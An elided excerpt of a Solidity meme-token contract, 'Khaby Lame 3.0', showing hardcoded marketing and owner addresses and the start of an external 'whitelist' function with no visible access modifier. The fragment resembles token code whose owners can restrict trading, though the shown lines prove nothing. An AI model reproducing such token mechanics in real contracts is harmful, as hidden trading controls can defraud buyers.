...
contract KhabyLameThree is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x59658c0b2E64DA90C008a27364ce63B5Bd04850C); 
    ...
    string private constant _name = "Khaby Lame 3.0"; 
    string private constant _symbol = unicode"KhabyTHREE"; 
    ...
    constructor () {
        ...
        _owner = 0x81E8353B7A9450EAE92E9182c4E0a0112920a071;
    ...
    function whitelist(address list, bool point) external virtual {
        require (list != Wallet_Marketing);
        require (list != uniswapV2Pair);
        require (list != _owner);
        require (list != Wallet_Burn);
